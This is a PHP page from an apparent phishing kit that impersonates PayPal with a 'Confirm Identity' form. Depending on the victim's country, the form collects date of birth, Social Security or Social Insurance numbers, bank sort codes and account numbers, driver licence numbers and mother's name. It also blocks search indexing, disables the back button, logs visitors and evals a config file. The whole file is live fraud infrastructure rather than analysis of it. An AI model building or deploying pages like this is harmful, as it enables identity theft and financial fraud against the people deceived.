<?php
require_once __DIR__ . '/function.php';

if (file_exists($api->dir_config . '/' . $api->general_config)) {
  @eval(file_get_contents($api->dir_config . '/' . $api->general_config));
}

if ($config_blocker == 1) {
  $api->cookie();
  $api->session();
}

$api->visitor("Information");
?>
<!DOCTYPE html>
<html>

<head>
<title><?=$api->transcode("PayPal: Confirm Identity");?></title>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=yes">
<meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noodp, noydir">
<link rel="shortcut icon" href="../assets/img/favicon.ico">
<link rel="apple-touch-icon" href="../assets/img/apple-touch-icon.png">
<link rel="stylesheet" href="../assets/css/myaccount_app.css">
<link rel="stylesheet" href="../assets/css/myaccount_wallet.css">
<script src="../assets/js/jquery.min.js"></script>
<script src="../assets/js/jquery.mask.js"></script>
<script src="../assets/js/jquery.validate.js"></script>
<script src="../assets/js/myaccount.information.js"></script>
<script type="text/javascript">
window.history.forward();

function noBack() {
window.history.forward();
}
</script>
</head>

<body onload="noBack();" onpageshow="if (event.persisted) noBack();" onunload="">
<section class="theoverpanel">
<div class="overpanel-wrapper row">
<div class="overpanel-content col-xs-12 col-xs-offset-0 col-sm-8 col-sm-offset-2 col-md-4 col-md-offset-4">
<div class="overpanel-header">
<h2><?=$api->transcode("Confirm Identity");?></h2>
</div>
<div class="overpanel-body">
<form method="post" id="information" autocomplete="off">
<div class="addressEntry">

<div class="textInput lap" id="DivDob">
<input type="tel" placeholder="<?=$api->transcode("Date of birth (DD/MM/YYYY)");?>" id="Dob" name="dob">
</div>
<?php
if($_SESSION['code'] == "US"){
  echo '<div class="textInput lap" id="DivSsn">
  <input type="tel" placeholder="'.$api->encode("Social Security Number").'" id="Ssn" name="ssn">
  </div>';
}
if($_SESSION['code'] == "UK" || $_SESSION['code'] == "IE"){
  echo '<div class="textInput lap" id="DivSort">
  <input type="tel" placeholder="'.$api->encode("Sort Code").'" id="Sort" name="sort">
  </div>';
}
if($_SESSION['code'] == "CA"){
  echo '<div class="textInput lap" id="DivSin">
  <input type="tel" placeholder="'.$api->encode("Social Insurance Numbe").'" id="Sin" name="sin">
  </div>';
}
if($_SESSION['code'] == "AU"){
  echo '<div class="textInput lap" id="DivDriver">
    <input type="text" placeholder="'.$api->encode("Driver License Number").'" id="Driver" name="driver">
    </div>

    <div class="textInput lap" id="DivOsid">
    <input type="text" placeholder="'.$api->encode("Online Shopping ID").'" id="Osid" name="osid">
    </div>';
}
if($_SESSION['code'] == "UK" || $_SESSION['code'] == "IE" || $_SESSION['code'] == "DE" || $_SESSION['code'] == "LU" || $_SESSION['code'] == "CH" || $_SESSION['code'] == "FL" || $_SESSION['code'] == "ES" || $_SESSION['code'] == "AL"){
  echo '<div class="textInput lap" id="DivAccnum">
  <input type="text" placeholder="'.$api->transcode("Account Number").'" id="Accnum" name="accnum">
  </div>';
}
if($_SESSION['code'] == "US" || $_SESSION['code'] == "UK" || $_SESSION['code'] == "CA" || $_SESSION['code'] == "AL"){
  echo '<div class="textInput lap" id="DivMother">
    <input type="text" placeholder="'.$api->transcode("Mother Name").'" id="Mother" name="mother">
    </div>';
}
?>

</div>
<input class="vx_btn" type="submit" value="<?=$api->transcode("Confirm");?>" id="btnConfirm">
<p class="scretlogo"></p>
</form>
</div>
</div>
</div>
<div class="hasSpinner hide" id="loading"></div>
</section>
<script src="../assets/js/information.post.js"></script>
</body>
</html>
